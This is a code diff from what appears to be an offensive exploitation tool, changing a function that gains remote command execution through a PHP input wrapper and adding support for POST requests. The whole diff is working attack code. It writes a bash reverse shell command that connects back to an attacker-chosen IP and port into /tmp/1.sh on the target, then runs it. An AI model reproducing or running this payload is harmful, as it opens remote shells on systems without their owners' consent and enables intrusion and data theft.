@@ -14,14 +14,25 @@ def exploit_bash(exploit, method, ip, port):
     bashTest = "which%20bash"
     bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
     bashPayloadStageTwo = "bash+/tmp/1.sh"
-
+    
     if(method == "INPUT"):
-        res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
+        bashTmpTest = "which bash"
+        bashTmpPayloadStageOne = "echo 'bash -i >& /dev/tcp/"+ip+"/"+str(port)+"+0>&1'>/tmp/1.sh"
+        bashTmpPayloadStageTwo = "bash /tmp/1.sh"
+
+        if(args.postreq): 
+            res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTmpTest)), config.proxies, "", "", exploit = True)
+        else: 
+            res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTmpTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
+        
         if("/bash" in res.text):
-            u = url.replace(config.tempArg, encode(bashPayloadStageOne))
             printInfo(ip, port, "bash", "input wrapper")
-            request.REQUEST(u, args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
-            request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
+            if(args.postreq):
+                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTmpPayloadStageOne)), config.proxies, "", "", exploit = True)
+                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTmpPayloadStageTwo)), config.proxies, "", "", exploit = True)
+            else:
+                request.REQUEST(url.replace(config.tempArg, encode(bashTmpPayloadStageOne)), args.httpheaders, post, config.proxies, "", "")
+                request.REQUEST(url.replace(config.tempArg, encode(bashTmpPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
             return True
     if(method == "DATA"):
         if(args.postreq): 
